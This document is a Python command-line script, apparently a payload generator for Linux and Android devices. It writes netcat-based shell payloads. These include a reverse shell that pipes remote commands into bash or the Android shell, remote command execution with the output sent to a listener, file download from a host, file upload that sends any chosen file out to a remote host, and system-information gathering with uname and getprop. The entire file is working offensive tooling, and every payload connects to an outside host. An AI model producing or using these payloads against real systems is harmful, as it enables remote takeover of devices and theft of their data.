import argparse


def write_payload(text: str, payloadName: str) -> None:
    """Generates the payload file by writing the text to the payload location"""
    # Write the text to the file, create if it doesn't exist
    with open(payloadName, "w") as f:
        f.write(text)

    return


def reverse_shell_gen(hostIP:str, hostPORT: str, listenIP: str, listenPORT: str, payloadName: str) -> None:
    #Command connection
    cmd_connection = f"nc {hostIP} {hostPORT}"
    #Connect listener
    connection_string = f"nc {listenIP} {listenPORT}"
    #Task string
    task = f'while [ 1 = 1 ]; do if [ `nc -z {hostIP} {hostPORT}; echo $?` != "0" ]; then break; else {cmd_connection} | "$shellloc" 2>&1 | {connection_string}; fi; done'
    #Check for /system/bin/sh and /bin/bash and respond accordingly
    payload_text = f'if [ -e /system/bin/sh ]; then shellloc="/system/bin/sh"; {task};elif [ -e /bin/bash ]; then shellloc="/bin/bash" ; {task}; else echo "could not find shellscript file location" | {connection_string}; fi'

    write_payload(payload_text, payloadName)

    return


def command_execution_gen(
    listenIP: str, listenPORT: str, commands: str, payloadName: str
) -> None:
    # Connect to listener
    connection_string = f"nc {listenIP} {listenPORT}"
    command_string = f'if [ -e /system/bin/sh ]; then {commands} 2>&1 | {connection_string}; elif [ -e /bin/bash ]; then {commands} | {connection_string}; else echo "could not execute command"; fi'
    # Write payload
    write_payload(command_string, payloadName)
    return

# TODO Add an md5 check for this if time allows
def file_download_gen(
    hostIP: str,
    hostPORT: str,
    saveLocation: str,
    payloadName: str,
    listenIP: str,
    listenPORT: str,
) -> None:
    # Connect to file host
    connection_string = f"nc {hostIP} {hostPORT}"
    # Connect to listener
    connection_string2 = f"nc {listenIP} {listenPORT}"
    # Build the payload
    first_connection = f"{connection_string} > {saveLocation}"
    check_file = f'if [ -e "{saveLocation}" ]; then echo "File has been downloaded to {saveLocation}"; else echo "File failed to download"; fi | {connection_string2}'
    payload_text = first_connection + "; " + check_file
    # Write the payload to output location
    write_payload(payload_text, payloadName)

    return


def file_upload_gen(
    hostIP: str,
    hostPORT: str,
    listenIP: str,
    listenPORT: str,
    file: str,
    payloadName: str,
) -> None:
    # For Connect to downloading nc
    connection_string = f"nc {hostIP} {hostPORT}"
    # Connect to listening report for hash
    feedback_connection = f"nc {listenIP} {listenPORT}"
    # Build payload
    payload_text = f'if [ -e "{file}" ]; then {connection_string} < "{file}"; if type "md5" > /dev/null; then md5 "{file}" | {feedback_connection}; elif type "md5sum" > /dev/null; then md5sum "{file}" | {feedback_connection}; else echo "md5 hashing not found" | {feedback_connection}; fi; else echo "file not found" | {feedback_connection}; fi'

    write_payload(payload_text, payloadName)

    return


def system_info_gathering_gen(listenIP: str, listenPORT: str, payloadName: str) -> None:
    # Connect to listener
    connection_string = f"nc {listenIP} {listenPORT}"
    # systeminfo
    sys_string = f'if type "uname" > /dev/null; then uname -a | {connection_string}; elif type "getprop" > /dev/null; then getprop | {connection_string}; else echo "Failed to get sysinfo" | {connection_string}; fi'

    write_payload(sys_string, payloadName)

    return


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Payload Generator for linux and android devices"
    )

    parser.add_argument(
        "-e",
        type=str,
        default=None,
        help="Desired Payload: rshell, cmd, download, upload, sysinfo",
        dest="payloadType",
        required=True,
    )
    parser.add_argument(
        "-i",
        type=str,
        default=None,
        help="Host IP address",
        dest="hostIP",
        required=False,
    )
    parser.add_argument(
        "-p", type=str, default=None, help="Host Port", dest="hostPORT", required=False
    )
    parser.add_argument(
        "-li",
        type=str,
        default=None,
        help="IP Address used for sending back results",
        dest="listenIP",
        required=False,
    )
    parser.add_argument(
        "-lp",
        type=str,
        default=None,
        help="Port used for sending back results",
        dest="listenPORT",
        required=False,
    )
    parser.add_argument(
        "-f",
        type=str,
        default=None,
        help="Target upload/download file location",
        dest="targetFile",
        required=False,
    )
    parser.add_argument(
        "-o",
        type=str,
        default="pl.sh",
        help="Output file name",
        dest="payloadName",
        required=False,
    )
    parser.add_argument(
        "-c",
        type=str,
        default=None,
        help="Execute command and send result to listener",
        dest="cmd",
        required=False,
    )

    args = parser.parse_args()

    if args.payloadType == "rshell":
        reverse_shell_gen(args.hostIP, args.hostPORT, args.listenIP, args.listenPORT, args.payloadName)
    elif args.payloadType == "cmd":
        if args.cmd is None:
            raise Exception(f"-c required for {args.payloadType}")
        if args.listenPORT is None:
            raise Exception(f"-lp required for {args.payloadType}")
        if args.listenIP is None:
            raise Exception(f"-li required for {args.payloadType}")
        command_execution_gen(
            args.listenIP, args.listenPORT, args.cmd, args.payloadName
        )
    elif args.payloadType == "download":
        if args.targetFile is None:
            raise Exception(f"-f required for {args.payloadType}")
        if args.listenPORT is None:
            raise Exception(f"-p2 required for {args.payloadType}")
        if args.listenIP is None:
            args.listenIP = args.hostIP
        file_download_gen(
            args.hostIP,
            args.hostPORT,
            args.targetFile,
            args.payloadName,
            args.listenIP,
            args.listenPORT,
        )
    elif args.payloadType == "upload":
        if args.targetFile is None:
            raise Exception(f"-f required for {args.payloadType}")
        if args.hostPORT is None:
            raise Exception(f"-p required for {args.payloadType}")
        if args.hostIP is None:
            raise Exception(f"-i required for {args.payloadType}")
        if args.listenPORT is None:
            raise Exception(f"-lp required for {args.payloadType}")
        if args.listenIP is None:
            raise Exception(f"-li required for {args.payloadType}")
        file_upload_gen(
            args.hostIP,
            args.hostPORT,
            args.listenIP,
            args.listenPORT,
            args.targetFile,
            args.payloadName,
        )
    elif args.payloadType == "sysinfo":
        if args.listenIP is None:
            raise Exception(f"-li required for {args.payloadType}")
        if args.listenPORT is None:
            raise Exception(f"-lp required for {args.payloadType}")
        system_info_gathering_gen(args.listenIP, args.listenPORT, args.payloadName)
    else:
        raise Exception(f"Invalid value for -e")


if __name__ == "__main__":
    main()
